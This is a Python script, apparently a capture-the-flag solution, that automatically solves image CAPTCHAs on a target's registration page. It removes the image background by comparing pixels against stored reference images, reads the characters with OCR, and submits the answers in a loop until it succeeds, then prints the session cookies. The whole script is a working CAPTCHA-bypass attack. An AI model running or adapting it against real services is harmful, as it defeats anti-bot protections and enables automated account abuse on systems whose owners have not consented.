import requests
import re
import os
import sys
import subprocess
from ocr import _ocr

try:
    from PIL import Image, ImageDraw
except ImportError:
    import Image
    import ImageDraw
import pytesseract

font_path = "./font"

if __name__ == "__main__":

    if len(sys.argv) > 2:
        hostt = sys.argv[1]
        port = int(sys.argv[2])
    else:
        print("Usage: python " + sys.argv[0] + " <host> <port>")
        sys.exit(-1)
    host = "http://"+hostt+":"+str(port)
    session = requests.Session()
    f = True
    n = 200-1
    while f:
        session.get(host + "/reg.php", allow_redirects=True)

        r = session.get(host + "/gen.php", allow_redirects=True)
        open('tmp.png', 'wb').write(r.content)
        image = Image.open("tmp.png")  # Открываем изображение.
        draw = ImageDraw.Draw(image)  # Создаем инструмент для рисования.
        width = image.size[0]  # Определяем ширину.
        height = image.size[1]  # Определяем высоту.
        pix = image.load()
        name_f = f'{pix[0, 0][0]}_{pix[0, 0][1]}_{pix[0, 0][2]}'
        # Открываем изображение.
        image_fon = Image.open(os.path.join(font_path, f"{name_f}.png"))
        pix_fon = image_fon.load()

        for i in range(width):
            for j in range(height):
                if pix[i, j][0] != pix_fon[i, j][0] or pix[i, j][1] != pix_fon[i, j][1] or pix[i, j][2] != pix_fon[i, j][2]:
                    a = 0
                else:
                    a = 255

                draw.point((i, j), (a, a, a))
        image.save("ans.png", "PNG")
        #image.save("ans.jpg", "JPEG")
        del draw

        a = _ocr("ans.png")

        r = session.post(host + "/reg.php", data={'captha': a})
        if not ('Captcha 0' in r.text):
            if 'Now you' in r.text:
                print(session.cookies.get_dict())
                # print(r.text)
                f = 0
            else:
                print('GOOD ============================\n' + str(n))
                print(r.text.split('Captcha ')[1].split('of')[0])
                n = n-1
        else:

            print('Fail')
            print('captcha '+str(n))
            print(a)
            break
            # print(r.text)
            f = 1
            n = 1336
            # '''
